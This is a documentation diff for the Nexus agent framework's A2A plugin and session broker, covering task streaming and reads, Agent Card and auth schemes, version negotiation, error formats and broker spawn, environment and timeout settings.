+| `tool.result` | `tool_result` | The call id, tool name, output (capped by `artifacts.max_tool_output_bytes`) and error. |
+| `subagent.started` / `.iteration` / `.complete` | `subagent` | The spawn id, phase, iteration and detail. A subagent that reported an error is phase `failed`. |
+| `llm.response` | `usage` | Per-call token accounting: input, output, cached, reasoning and total. Reported for **every** response including the intermediate tool-calling ones, so the turn's cost is the sum rather than the last call. |
+
+The carrier is `TaskStatusUpdateEvent.metadata`, keyed by the extension URI. The
+status those frames carry is the task's **current** state, not a hard-coded
+`WORKING`: a telemetry frame emitted while the task is parked at
+`INPUT_REQUIRED` must not tell a client the task went back to work.
+
+**Opt-in is per request and is honoured by not sending.** A client asks with the
+`A2A-Extensions` service parameter:
+
+```bash
+curl -sN localhost:8091/a2a \
+  -H 'A2A-Version: 1.0' \
+  -H 'A2A-Extensions: https://github.com/frankbardon/nexus/a2a/extensions/agent-events/v1' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"SendStreamingMessage","params":{…}}'
+```
+
+The response echoes `A2A-Extensions` with the extensions that were actually
+**activated**, so a client asking for several can tell which it got; an extension
+this agent does not speak produces no echo and no error. A client that asked for
+nothing receives a stream with no extension metadata on it at all.
+
+**Telemetry is not persisted.** It is the one frame class that does not go
+through the task store's write-through path. A stored telemetry frame would land
+in the status history as a `WORKING` transition, so `GetTask` would replay a
+turn's reasoning as state changes the task never made — and a long turn would
+fill the history table with them. `GetTask` and `SubscribeToTask`'s opening
+snapshot therefore carry the canonical task only; telemetry is a live signal on
+an attached stream.
+
+#### Reading tasks
+
+`GetTask`, `ListTasks` and `SubscribeToTask` answer from the store above. There
+is no configuration for any of them; the behaviour below is fixed.
+
+| Operation | JSON-RPC | REST |
+|---|---|---|
+| `GetTask` | `params: {id, historyLength?}` | `GET <rest_prefix>/tasks/{id}?historyLength=` |
+| `ListTasks` | `params: {contextId?, status?, pageSize?, pageToken?, historyLength?, statusTimestampAfter?, includeArtifacts?}` | `GET <rest_prefix>/tasks?…` (§11.5 camelCase query parameters) |
+| `SubscribeToTask` | `params: {id}` → SSE | `POST <rest_prefix>/tasks/{id}:subscribe` → SSE |
+
+- **History** is the trail of message *references* the store retained, rendered
+  as text messages stamped with their task and context — not a replay of
+  `memory.history`. §3.7 leaves it to the server which messages are persisted,
+  so a bounded reference trail is a conforming history. `historyLength` unset
+  keeps everything retained, `0` omits history, and `N` keeps the most recent
+  `N` messages.
+- **`ListTasks` pagination** defaults to a page size of 50 and is bounded to
+  1–100 (§3.2). `nextPageToken` is an opaque **keyset** cursor over
+  `(created_at, rowid)`, not an offset, so a task created or evicted mid-walk
+  cannot make a client skip or repeat a row. A token this server did not mint is
+  an `InvalidParamsError`, not a silent restart. `totalSize` is counted under the
+  identical filters, so it counts the same set the client is paging through.
+- **`includeArtifacts` defaults to false**, per §3.2, so a page stays small;
+  `GetTask` always returns artifacts. History has no such default in the
+  specification and is therefore included in a listing unless the request caps
+  it — pass `historyLength: 0` for a compact page.
+- **`SubscribeToTask`** always opens with the task's current state. A live task
+  then streams the same frames every other attached stream receives — several
+  clients may follow one task and all see an identical sequence from the point
+  they joined. An already-terminal task yields its terminal snapshot and the
+  stream closes immediately. A task that is neither (one this process was
+  serving when it last stopped) gets its snapshot and then a close, since
+  nothing will ever update it again — though after a restart such a task is
+  settled at `FAILED` when the store opens, so the snapshot names a real ending.
+- **Ownership is not enumerable.** Every read goes through the store's
+  principal-scoped view, so a task belonging to another principal answers
+  exactly as an unknown id does: the same `TaskNotFoundError`, the same HTTP
+  404, the same body, from the same single lookup. A distinct "exists but is not
+  yours" answer would be an existence oracle for ids the caller was never told.
+
+#### `contextId` and the Nexus session
+
+An A2A context is a conversation and so is a Nexus session, so `contextId` maps
+onto the session — but a Nexus process owns exactly **one** session, fixed at
+boot, and there is no bus primitive that starts a second one or resets history.
+The binding follows from that:
+
+- The first call **claims** the session. A client that names no `contextId` is
+  assigned the session id and gets it back on the Task, so it can keep using it.
+- Later calls naming the **same** context continue the conversation, with
+  history intact — `memory.history` persists across turns within a session.
+- A **different** `contextId` is refused with `UnsupportedOperationError` naming
+  the bound context. Accepting it would hand the caller a conversation already
+  carrying another context's history while calling it new. Run one instance per
+  context; the [session broker](../guides/session-broker.md) automates exactly
+  that.
+
+#### Agent Card content
+
+`card:` is the **hand-authored** half of the discovery document.
+
+| Key                            | Type            | Default     | Description |
+|--------------------------------|-----------------|-------------|-------------|
+| `card.name`                    | string          | *(required)*| Human-readable agent name. |
+| `card.description`             | string          | *(required)*| What the agent does. Required by the A2A specification, so it is always serialized. |
+| `card.version`                 | string          | *(required)*| The agent's own version, independent of the A2A protocol version. |
+| `card.documentation_url`       | string          | *(empty)*   | URL of human-readable documentation. |
+| `card.icon_url`                | string          | *(empty)*   | URL of an icon representing the agent. |
+| `card.provider.organization`   | string          | *(required when `provider` is set)* | The operating organization's name. |
+| `card.provider.url`            | string          | *(empty)*   | The provider's website. |
+| `card.default_input_modes`     | string or list<string> | *(empty)* | Media types the agent accepts when a skill does not narrow them, e.g. `text/plain`. |
+| `card.default_output_modes`    | string or list<string> | *(empty)* | Media types the agent produces when a skill does not narrow them. |
+| `card.skills`                  | list<map>       | *(required, ≥1)* | What the agent advertises it can do. |
+| `card.skills[].id`             | string          | *(required)*| Unique skill id within the card. |
+| `card.skills[].name`           | string          | *(required)*| Human-readable skill name. |
+| `card.skills[].description`    | string          | *(required)*| What the skill does. |
+| `card.skills[].tags`           | string or list<string> | *(empty)* | Keywords for discovery and filtering. |
+| `card.skills[].examples`       | string or list<string> | *(empty)* | Sample prompts that exercise the skill. |
+| `card.skills[].input_modes`    | string or list<string> | *(empty)* | Narrows `default_input_modes` for this skill. |
+| `card.skills[].output_modes`   | string or list<string> | *(empty)* | Narrows `default_output_modes` for this skill. |
+
+**Skills are deliberately hand-authored** — they are **not** derived from
+`nexus.skills` or the tool catalog. The card is a public contract: an internal
+catalog churns with every plugin an operator enables, and a discovery document
+that churned with it would both leak internal structure and break clients that
+keyed off it.
+
+**There are no keys for `supportedInterfaces`, `capabilities`,
+`securitySchemes` or `securityRequirements`, and there never will be.** Those
+describe what the listener actually does, so they are **derived** and overwrite
+whatever the card source carried — including a complete `card_file` document. A
+card naming a URL nothing is bound to, a capability nothing implements, or a
+scheme nothing enforces is worse than no card: it is a confident wrong answer.
+Concretely:
+
+- `supportedInterfaces` is `[{public_url + jsonrpc_path, JSONRPC, 1.0},
+  {public_url + rest_prefix, HTTP+JSON, 1.0}]`, in that preference order.
+- `capabilities.streaming` / `pushNotifications` / `extendedAgentCard` are
+  computed from the set of operations the plugin actually implements.
+- `securitySchemes` / `securityRequirements` come from the validator chain.
+
+The card is rendered and validated **at boot**: a card that could not be served
+fails the process start, not the first partner's request. It is served with an
+`ETag` (a hash of the card content, so an edit that does not bump
+`card.version` still invalidates a cache) and `Cache-Control: public,
+max-age=300`, per specification §8.6.1; `If-None-Match` yields `304`.
+
+#### Agent Card security schemes
+
+The card's `securitySchemes` and `securityRequirements` are derived from the
+configured validators, so what a client is told to present is what the chain
+enforces. One validator becomes one named scheme plus one requirement entry;
+the scheme name is the chain-order name `nexusauth` already assigned (`static`,
+`jwks`, `jwks#2`), so the card and the boot log name the same thing.
+
+| Validator type   | Scheme published |
+|------------------|------------------|
+| `static` (and the desugared `bearer_token`) | `httpAuthSecurityScheme` with `scheme: Bearer`. |
+| `jwks`           | `httpAuthSecurityScheme` with `scheme: Bearer`, `bearerFormat: JWT`; the description names the configured `issuer` and `audience` so a client knows where to obtain a token. |
+| `introspect`     | `httpAuthSecurityScheme` with `scheme: Bearer` and **no** `bearerFormat` — an introspected token is opaque by construction. |
+| `proxy_headers`  | **Nothing.** This validator accepts no client credential: it honours an identity a trusted fronting proxy already established and refuses those headers from anyone outside the CIDR allowlist. Publishing a scheme would instruct clients to send a header guaranteed to be ignored, or invite them to assert an identity directly. Auth is still enforced. |
+
+Requirements are emitted as **separate entries** rather than one entry naming
+every scheme, because that is the accurate translation of a `nexusauth.Chain`:
+the chain is first-success, so satisfying *any* validator suffices, and A2A
+spells "any of these alternatives" as separate members of the
+`securityRequirements` array. With no validators configured the card carries no
+`securitySchemes` at all, which is the honest document for a listener that
+admits everyone — and is why the bind address defaults to loopback.
+
+#### Agent Card auth posture
+
+`GET /.well-known/agent-card.json` is **unauthenticated by default**, even when
+every operation is guarded.
+
+Specification §8.2 makes the well-known URI a pre-authentication bootstrap step:
+a client fetches the card precisely to discover which credentials to obtain
+(§7.3, step 1), so gating it behind those same credentials is circular and
+breaks every conforming client. The specification's answer for a card that must
+stay private is a separate authenticated document behind
+`GetExtendedAgentCard` (§6.9), which this plugin does not implement and honestly
+declares as `false`.
+
+The counter-argument is real, and is why `card_requires_auth` exists: this card
+names a *private* agent, and its description, skills and examples may describe
+capability an operator would rather not publish. Two things answer it. First,
+the listener binds loopback by default, so the "public" document is not
+reachable from anywhere the operator did not deliberately open. Second, the
+card's contents are hand-authored for exactly this reason — nothing is derived
+from the tool catalog, so what the card reveals is what an operator chose to
+reveal.
+
+An operator who moves `bind` off loopback and still needs the card private sets
+`card_requires_auth: true` and distributes the document out-of-band, which §8.2
+explicitly sanctions ("Direct Configuration"). That is a real trade — it makes
+the agent undiscoverable to clients that have not already been told about it —
+so it is opt-in, not the default.
+
+`OPTIONS` preflight on every route is **never** authenticated: a browser does
+not attach `Authorization` to a preflight.
+
+#### A2A version negotiation
+
+Specification §3.6.2 says an agent MUST interpret an empty `A2A-Version` as
+`0.3`. `pkg/a2a` implements that literally, and since the codec speaks only
+`1.0`, the literal reading turns every header-less request into a
+`VersionNotSupportedError`. That rule exists to protect clients that predate the
+parameter — an agent that used to serve `0.3` must not silently reinterpret an
+old client's requests under new semantics.
+
+**This listener has no such client to protect**, so the default is the lenient
+reading:
+
+| `strict_version_header` | Absent `A2A-Version` is read as | Effect |
+|-------------------------|--------------------------------|--------|
+| `false` *(default)*     | `1.0`                          | The request is processed. Every response carries `A2A-Version: 1.0` so the client can see what it was processed as rather than infer it. |
+| `true`                  | `0.3`                          | The literal §3.6.2 behaviour: the request is refused with `VersionNotSupportedError`. |
+
+An *explicit* unsupported version (`A2A-Version: 0.3`) is refused under **both**
+settings — the policy only governs absence. The parameter may also ride a query
+parameter (`?A2A-Version=1.0`), which §3.6.1 permits.
+
+Set `strict_version_header: true` for a conformance harness, or for a
+deployment that will later front a `0.3` interface from the same origin.
+
+#### Error envelopes
+
+Each binding answers in its own shape, so a client parses one format per
+endpoint:
+
+| Condition | JSON-RPC binding | REST binding |
+|---|---|---|
+| Protocol error (bad params, unknown method, unsupported operation, unsupported version) | HTTP `200` with a JSON-RPC error object carrying the A2A code (`-32602`, `-32601`, `-32004`, `-32009`, …) and the request id echoed. `200` is the JSON-RPC contract: the outcome rides the body. | The §11.6 `google.rpc.Status` body with the A2A error's mapped HTTP status and a `google.rpc.ErrorInfo` detail (`domain: a2a-protocol.org`). |
+| Authentication / authorization refusal | HTTP `401`/`403`/`503` **plus** a JSON-RPC error object with code **`-32000`** and an `ErrorInfo` detail (`domain: nexus.io.a2a`). | The same `google.rpc.Status` shape with status `UNAUTHENTICATED` / `PERMISSION_DENIED` / `UNAVAILABLE`. |
+| Unknown path under `rest_prefix` | — | `404` with `MethodNotFoundError`. |
+| Known path, wrong verb | — | `405` with an `Allow` header naming the verb that would have worked. |
+
+A2A defines no authentication error in its taxonomy: §3.3.2 names "HTTP 401
+Unauthorized, gRPC UNAUTHENTICATED, **JSON-RPC custom error**", leaving the
+code to the implementation. `-32000` is the one value in JSON-RPC 2.0's
+implementation-defined server-error range that A2A does *not* claim for itself
+(A2A reserves `-32001`…`-32099`), so it cannot collide with a protocol error a
+client already knows how to interpret. The HTTP status stays the authoritative
+signal; the body exists so a client that only parses envelopes still gets a
+well-formed one. The RFC 6750 `WWW-Authenticate` challenge and the `Retry-After`
+on `503` follow the same status mapping `nexus.io.agui` and the broker use — the
+denial kinds are the shared package's transport contract, and one deployment
+should not answer the same refusal three different ways.
+
+#### Example
+
+```yaml
+plugins:
+  nexus.io.a2a:
+    bind: "0.0.0.0:8091"
+    public_url: "https://agent.example.com"
+    bearer_token_env: NEXUS_A2A_TOKEN
+    cors_origins: ["https://console.example.com"]
+    card:
+      name: "Nexus Research Agent"
+      description: "Runs research turns with web search and file tools."
+      version: "1.2.0"
+      documentation_url: "https://example.com/docs/agent"
+      provider:
+        organization: "Example Inc."
+        url: "https://example.com"
+      default_input_modes: ["text/plain"]
+      default_output_modes: ["text/plain"]
+      skills:
+        - id: research
+          name: "Research a topic"
+          description: "Searches the web and summarizes findings with citations."
+          tags: ["research", "search", "summarization"]
+          examples:
+            - "Summarize the last three papers on retrieval-augmented generation."
+```
+
 ### `nexus.io.realtime`
 
 Source: `plugins/io/realtime/plugin.go`. WebSocket bidirectional transport
@@ -1539,7 +2322,7 @@ operators normally set neither by hand:
 |---------------|--------|-----------------------------|-------------|
 | `broker_addr` | string | `$NEXUS_BROKER_ADDR`        | WebSocket URL of the broker's instance dial-back endpoint (e.g. `ws://127.0.0.1:8080/instance`). Falls back to the `NEXUS_BROKER_ADDR` env var. When empty the plugin stays dormant (no dial). |
 | `lease_id`    | string | `$NEXUS_BROKER_LEASE_ID`    | Lease id assigned by the broker at spawn; echoed in the `register` frame. Falls back to the `NEXUS_BROKER_LEASE_ID` env var. When empty the plugin stays dormant. |
-| `spawn_secret` | string | `$NEXUS_BROKER_SPAWN_SECRET` | Per-spawn secret the broker generates for this instance and injects at exec; echoed in the `register` frame alongside `lease_id`. Falls back to the `NEXUS_BROKER_SPAWN_SECRET` env var. Empty is valid and does **not** make the plugin dormant — a broker with no `auth:` block does not check it, unless the lease was restored after a broker restart. |
+| `spawn_secret` | string | `$NEXUS_BROKER_SPAWN_SECRET` | Per-spawn secret the broker generates for this instance and injects at exec; echoed in the `register` frame alongside `lease_id`. Falls back to the `NEXUS_BROKER_SPAWN_SECRET` env var. Empty does **not** make the plugin dormant — it dials and is refused. Every broker requires it, with or without an `auth:` block. |
 
 The `spawn_secret` is a **second factor for the dial-back socket**. The lease id
 alone is a poor authenticator for it: the same value appears in `ws_url`s, client
@@ -1557,14 +2340,16 @@ recompute the value a surviving instance still holds; the secret itself is still
 never written to disk. See
 [Restart recovery](#restart-recovery-reattach_window).
 
-Enforcement on the broker side is **gated on the broker having an `auth:` block**
-(see the Session broker section below), with one exception. With no `auth:` block
-the secret is ignored, so a `nexus` binary at `nexus_binary_path` that predates
-the protocol keeps working; with one configured, such a binary is refused and the
-broker logs a message naming version skew as the likely cause. The exception is a
-lease **restored after a broker restart**, which always requires the secret
-regardless of `auth:` — a live pid is not proof of identity. The value is never
-logged and never appears in `GET /leases`.
+Enforcement on the broker side is **unconditional**: every register frame must
+carry the secret, with or without an `auth:` block, on a freshly claimed lease or
+on one restored after a broker restart. It used to be gated on `auth:`, which
+meant an unauthenticated broker authenticated its dial-back socket with a lease id
+alone — a value that travels in `ws_url`s, client requests and logs. **A `nexus`
+build that predates the protocol is therefore now refused everywhere**, and
+removing the `auth:` block is no longer a workaround; upgrade the binary the
+[binary registry](#binary-registry-binaries) entry points at. The value is never
+logged and never appears in `GET /leases`. See
+[Instance dial-back authentication](#instance-dial-back-authentication-ws-instance).
 
 **Outbound IO messages** (instance → broker → client, JSON inside the frame
 payload): `output`, `stream.delta`, `stream.end`, `status`, `approval.request`,
@@ -1636,6 +2421,7 @@ Source: `plugins/io/test/plugin.go`. Non-interactive testing transport.
 | `approval_mode`          | string   | `approve`   | `approve`, `deny`, `per-prompt`. |
 | `approval_rules`         | list     | *(empty)*   | Per-prompt rules: each `{match: <substring>, action: <approve|deny>}`. |
 | `hitl_responses`         | list     | *(empty)*   | Scripted answers to `hitl.requested` events. Bare strings are treated as `free_text`; `{choice_id: ..., free_text: ...}` maps populate the corresponding response fields. |
+| `hitl_auto_respond`      | bool     | `true`      | Whether `hitl.requested` is answered automatically (the next `hitl_responses` entry, else the request's `default_choice_id`, else an empty answer). Set `false` to leave a question genuinely unanswered so something else owns the answer — another transport, or another engine, as in the [A2A loopback](../guides/a2a.md#nexusnexus-loopback). The event is still collected either way. |
 | `mock_responses`         | list     | *(empty)*   | Synthetic LLM responses. Each `{content, tool_calls: [{name, arguments}]}`. When set, the plugin vetoes real `llm.request` events. |
 | `timeout`                | duration | `60s`       | Session timeout. |
 | `read_stdin`             | bool     | `true`      | Read stdin when no other input source is available. |
@@ -2490,14 +3276,69 @@ instances behind an HTTP/WebSocket gateway.
 # broker.yaml
 listen_addr: ":8080"
 advertise_addr: ""            # required behind a proxy/LB; see below
-nexus_binary_path: "nexus"
-max_concurrent: 8
+
+# The named registry of nexus variants this broker may spawn. The `nexus` entry
+# always exists — declare it to override its path, omit it to take the default.
+binaries:
+  nexus:
+    path: "nexus"
+  vision:
+    path: "/opt/nexus/bin/nexus-vision"
+    label: "Nexus (vision)"
+    description: "Multimodal build with the image tools compiled in"
+    args: ["-profile", "vision"]
+    env:
+      NEXUS_VISION: "1"
+
+# Optional. Variables a spawn inherits from the BROKER'S own environment, by
+# name. A spawn is otherwise built from scratch — no wildcard is supported.
+inherit_env:
+  - ANTHROPIC_API_KEY
+
+# Optional. Default OS credential for entries that declare none. Needs a
+# privileged broker (root, or CAP_SETUID and CAP_SETGID).
+# run_as:
+#   uid: 1500
+#   gid: 1500
+
+max_concurrent: 8             # a HEADCOUNT, not a resource budget; see below
+client_replay_buffer_bytes: 1048576   # per-lease client-bound replay retention (1 MiB)
 idle_timeout: 5m
+max_turn_duration: 30m        # bound on an in-flight turn; <=0 disables the bound
 queue_wait_timeout: 30s
+max_queue_depth: 64           # ceiling on parked over-capacity claims; <=0 = unlimited
+max_leases_per_principal: 0   # 0 = off; needs `auth:` to have any effect
+max_queued_per_principal: 0   # 0 = off; needs `auth:` to have any effect
 release_grace: 10s
+ready_timeout: 30s            # ceiling on instance BOOT; raise it for a slow-starting config
+session_report_grace: 5s      # post-ready wait for the instance's session id
+max_claim_body: 1048576       # ceiling on the claim request body (1 MiB); it carries the whole config
 state_dir: ""                 # empty = lease state is in-memory only; see below
 broker_id: ""                 # empty = generated once and persisted in state_dir
 reattach_window: 60s          # how long a lease restored after a restart waits for its instance
+
+# Optional. The A2A front door: one public agent per profile. Omit the whole
+# block and the broker has no A2A ingress, exactly as before.
+agents:
+  support:
+    binary: nexus               # optional; omitted means the reserved `nexus` entry
+    config: "~/agents/support.yaml"
+    card:
+      name: "Support Agent"
+      description: "Answers customer questions from the product knowledge base."
+      version: "1.2.0"
+      skills:
+        - id: "answer"
+          name: "Answer questions"
+          description: "Answers a customer question and cites its sources."
+
+# Optional. Settings every `agents:` profile shares. Omit it and the defaults
+# below apply.
+a2a:
+  tasks:
+    ttl: 24h                  # how long a finished task stays readable
+    max_per_context: 50       # how many tasks are kept per caller+conversation
+    input_timeout: 15m        # how long a task may wait at INPUT_REQUIRED
 
 # Optional. Omit the whole block to run the broker unauthenticated.
 auth:
@@ -2515,15 +3356,756 @@ auth:
 |----------------------|----------|----------|-----------------------------------------------------------------------------|
 | `listen_addr`        | string   | `:8080`  | host:port the broker's HTTP/WS gateway binds to. `GET /healthz` returns `{"status":"ok"}`. |
 | `advertise_addr`     | string   | *(empty)* | The address **clients** use to reach **this** broker, and the highest-precedence input to the `ws_url` returned by `POST /claim`. Accepts a bare `host:port` (implying `ws://`) or a scheme-qualified `ws://`, `wss://`, `http://` or `https://` host — the port is optional in that form, and `http`/`https` are normalized to `ws`/`wss`. **Required whenever the broker sits behind a reverse proxy or load balancer**, or whenever `listen_addr` uses a wildcard/empty host (`:8080`, `0.0.0.0:8080`, `[::]:8080`): without it the `ws_url` is derived from the claim request's `Host` header, which then names the proxy rather than the broker holding the lease. Validated at boot — a value with no port, a wildcard host (`0.0.0.0`, `::`), an unsupported scheme, or any path/query/fragment/userinfo **fails startup**. Leave it empty for a directly-reachable broker; the `ws_url` then resolves exactly as it did before this key existed. See [`ws_url` resolution](#ws_url-resolution) below. |
-| `nexus_binary_path`  | string   | `nexus`  | Path to the `nexus` binary the broker exec()s to spawn instances. Funneled through `ExpandPath` (supports `~`). |
-| `max_concurrent`     | int      | `8`      | Maximum number of live instances (one per lease). Each `POST /claim` acquires a capacity slot **before** spawning, and the slot is freed on every teardown path (manual `POST /release`, idle, crash, and any failed/aborted claim), so the live count can never exceed this cap or drift. A claim that arrives at capacity does **not** fail outright: it parks in a FIFO wait queue bounded by `queue_wait_timeout` (see below). Set `max_concurrent` to `0` (or any non-positive value) to mean **unlimited** (no cap). |
-| `idle_timeout`       | duration | `5m`     | How long an instance may sit with no real client input before the broker releases it. "Activity" is **only** an inbound `io` frame flowing client → instance (user input); instance → client output, pings, and control frames do **not** reset the timer. The release reuses the `POST /release` teardown path (shutdown frame → `release_grace` → force-kill → reap), so the session is persisted and the client WS closes with the going-away status. A background sweeper polls at `min(idle_timeout/4, 15s)` (floored at `50ms`). Set `idle_timeout` to `0` (or any non-positive value) to **disable** idle reaping entirely. |
+| `binaries`           | map      | *(synthesized)* | The registry of named `nexus` variants this broker may spawn, keyed by the name a claim selects. Entry fields are listed under [Binary registry](#binary-registry-binaries) below. After a successful load the registry **always** contains a `nexus` entry — the name is reserved and an operator's block can add to the registry but cannot remove it. Omit the key entirely and the registry is synthesized as a single `nexus` entry with path `nexus`, which is exactly the pre-registry behaviour. Validated at boot: an entry with an empty name, an empty/missing `path`, or a name that collides with another after trimming **fails startup**, and so does **any entry whose `path` does not resolve to an executable file** — see [Binary resolution](#binary-resolution) below. |
+| `inherit_env`        | list of string | *(empty)* | The variables a spawned instance inherits from the **broker's own environment**, by **name** only. A spawn carries the always-pass set (`HOME`, `LANG`, `PATH`, `TZ`), everything named here that the broker process actually holds, its entry's [`env`](#binary-registry-binaries), and the three broker-owned `NEXUS_BROKER_*` variables — **and nothing else**. Empty (the default) means an instance carries no provider credential from the broker's shell, which is a **deliberate break** with the earlier behaviour of passing `os.Environ()` through wholesale; see [Instance environment](#instance-environment-inherit_env) below and the guide's migration note. Entries are trimmed, de-duplicated and sorted at load. An empty entry, a `NAME=value` pair (this key forwards a variable, it does not set one — use `binaries.<name>.env` for that) or a `NEXUS_BROKER_*` name (injected by the broker on every spawn, so declaring it does nothing) is a **boot failure** naming the key. A declared name the broker does not hold is **not** an error: it is skipped, omitted from the per-entry boot log line, and named once in a startup `WARN`. |
+| `run_as`             | map      | *(absent)* | The **default OS credential** spawned instances run under — `uid` and `gid`, both required whenever the block is written — for every `binaries:` entry that does not declare its own. Absent (the default) means instances run as the broker's own uid and gid, exactly as they always have, and the spawn is byte-identical to what it was before this key existed. An entry's [`run_as`](#binary-registry-binaries) **replaces** this outright rather than merging field by field. Validated at boot: a block with only one of the two fields, a negative id, or an id above 4294967295 **fails startup** naming the key (and, for an entry, the entry). Requires the broker to run as **root** or hold `CAP_SETUID` **and** `CAP_SETGID`; otherwise every claim selecting such an entry fails to spawn. See [Running instances as another user](#running-instances-as-another-user-run_as) below. |
+| `nexus_binary_path`  | string   | `nexus`  | **Deprecated — use `binaries.nexus.path`.** Path to the `nexus` binary the broker exec()s to spawn instances. Funneled through `ExpandPath` (supports `~`). Still honoured so existing deployments boot unchanged: when it is set and `binaries.nexus` is **absent**, its value is folded into the reserved `nexus` entry and the broker logs one `WARN` naming the replacement key. Setting it **and** `binaries.nexus` is a **boot failure** naming both keys — see [Binary registry](#binary-registry-binaries). Setting it to the empty string is also a boot failure (remove the key to take the default). |
+| `max_concurrent`     | int      | `8`      | Maximum number of live instances (one per lease). Each `POST /claim` acquires a capacity slot **before** spawning, and the slot is freed on every teardown path (manual `POST /release`, idle, crash, and any failed/aborted claim), so the live count can never exceed this cap or drift. A claim that arrives at capacity does **not** fail outright: it parks in a FIFO wait queue bounded by `queue_wait_timeout` (see below). Set `max_concurrent` to `0` (or any non-positive value) to mean **unlimited** (no cap). It is a **headcount, not a resource budget**: an instance pinning a 200k-token context counts exactly one, the same as an idle one, and the key bounds nothing about the memory, CPU or disk those instances hold. There is deliberately no per-lease resource limit in the broker — that belongs to the deployment (a systemd slice, a cgroup, one container per instance), so size this key such that `max_concurrent` × the per-instance limit fits the host. It is also **global**, not per [`binaries:`](#binary-registry-binaries) entry: one variant can fill it for every other. |
+| `client_replay_buffer_bytes` | int | `1048576` (1 MiB) | How many bytes of **already-sent, client-bound frames** each lease retains so a client that missed them can be replayed. The broker stamps a **monotonic, per-lease sequence** (`seq`, counting from 1) on every frame it sends a lease's client, and keeps the encoded bytes here, evicting **oldest first** once the bound is reached. Both of the gateway's loss paths — no client attached, and an attached client whose send queue is full — retain the frame rather than discarding it, so the gap is both **detectable** (the sequence jumps) and **recoverable** (the frames are still held). Only client-bound frames are sequenced and buffered: instance-bound frames carry no `seq` and are not retained, so nothing on the dial-back side changed. The bound is in **bytes, not frames**, because client-bound payloads run from a few-byte token delta to a hundred-kilobyte tool result — a frame count would say nothing about memory. **Worst-case memory across the broker is this value × [`max_concurrent`](#session-broker-nexus-broker)** — 8 MiB at both defaults; with `max_concurrent: 0` (unlimited) it is unbounded, so pair the two. A single frame larger than the whole bound is not retained at all (it is evicted immediately) rather than breaching the bound. Set it to `0` to **disable retention** while leaving sequencing intact: loss stays visible to the client, but the broker keeps nothing to replay. A **negative** value is a boot failure naming the key. Clients reach the retained frames with [`?from_seq=`](#ws-leaselease_id-http-api-not-yaml) on the client socket, which replays the retained tail before the live stream and announces an explicit `stream-gap` frame when the bound can no longer cover the requested resume point. The buffer is **in-memory and dies with the lease**: it is never journaled, `state_dir` does not persist it, and a broker restart starts every lease's sequence again at 1 with an empty buffer. |
+| `idle_timeout`       | duration | `5m`     | How long a lease with **no turn in flight** may sit with no client activity before the broker releases it, with the terminal reason `idle`. "Activity" is an inbound `io` frame flowing client → instance (user input) **or** the moment the instance reports its turn finished; instance → client output mid-turn, pings, and control frames do **not** reset the timer. A lease whose instance is **working** is exempt regardless of how long ago the client last typed — the broker reads the `io.status` state off the instance's own frames, treats `thinking`, `tool_running`, `streaming`, `waiting` and `cancelling` as a live turn and `idle` as its end, and bounds the exemption with [`max_turn_duration`](#session-broker-nexus-broker). So this key is sized to the longest **human pause** a session should survive, not to the longest **turn** an agent might take. The release reuses the `POST /release` teardown path (shutdown frame → `release_grace` → `SIGTERM` to the process group → `SIGKILL` → reap), so the session is persisted and the client WS closes with the going-away status. A background sweeper polls at `min(idle_timeout/4, 15s)` (floored at `50ms`). Set `idle_timeout` to `0` (or any non-positive value) to **disable** reaping entirely — which also switches off `max_turn_duration`, since the same sweeper enforces both. |
+| `max_turn_duration`  | duration | `30m`    | How long a **single in-flight turn** may exempt its lease from `idle_timeout` before the broker releases it anyway, with the distinct terminal reason `turn timeout` (not `idle`, so an operator reading the journal can tell "nobody was here" from "killed mid-work"). It is the backstop on the live-turn exemption: an instance that wedges, or whose tool never returns, never reports the `idle` state that settles a turn and would otherwise hold its lease — and its `max_concurrent` slot — for the lifetime of the broker. The clock starts at the **first** work state after a settled period and is *not* refreshed by later status frames, so it measures the whole turn rather than the gap between frames. Teardown is the ordinary shared path, identical to an idle release apart from the recorded reason. Set it to `0` (or any non-positive value) to **disable the bound**, restoring an unbounded exemption — a live turn then holds its lease indefinitely. It is enforced by the idle sweeper, so it is inert when `idle_timeout <= 0`. Size it above the longest turn this deployment legitimately runs: a lease reaped as `turn timeout` had work in progress. |
 | `queue_wait_timeout` | duration | `30s`    | How long an over-capacity `POST /claim` parks in the **FIFO capacity wait queue** before giving up. When `max_concurrent` is full, a claim waits in arrival order; the moment a slot frees (via `POST /release`, idle, or crash teardown) it is handed **directly** to the oldest waiter, which then spawns — no fresh claim can barge ahead of a longer-queued one, and the waiters reuse the same single slot counter (no second accounting path). A waiter that exceeds `queue_wait_timeout` returns **HTTP 503** `{"error":"capacity wait timed out"}` (distinct message from the immediate `{"error":"no capacity"}`). If the client disconnects while queued, the waiter is dropped from the queue and holds no slot. Set `queue_wait_timeout` to `0` (or any non-positive value) to **disable waiting**: an at-capacity claim is then rejected immediately with **HTTP 503** `{"error":"no capacity"}` (no instance spawned). |
-| `release_grace`      | duration | `10s`    | How long a release (manual `POST /release`, and later idle/crash teardown) waits for an instance to shut its engine down cleanly before the broker force-kills it. The graceful path always persists the session; the kill is the orphan-prevention backstop. |
-| `state_dir`          | string   | *(empty)* | Per-broker directory holding this broker's **lease journal** (`leases.jsonl`), its **spawn-secret derivation key** (`spawn-key`, mode `0600`) and, when `broker_id` is unset, its generated identity (`broker-id`). Funneled through `ExpandPath` (supports `~`). **Empty (the default) disables lease persistence entirely**: nothing is written, no directory is created, spawn secrets stay random per spawn, restart recovery does not run, and the broker behaves exactly as it did before this key existed — it logs one `WARN` at startup saying lease state is in-memory only. **Must not be shared between brokers**: two brokers pointed at one directory would append to the same journal and compact each other's live leases away. Created on demand (mode `0700`); a `state_dir` that is set but unusable **fails startup**. See [Lease durability](#lease-durability-state_dir) and [Restart recovery](#restart-recovery-reattach_window) below. |
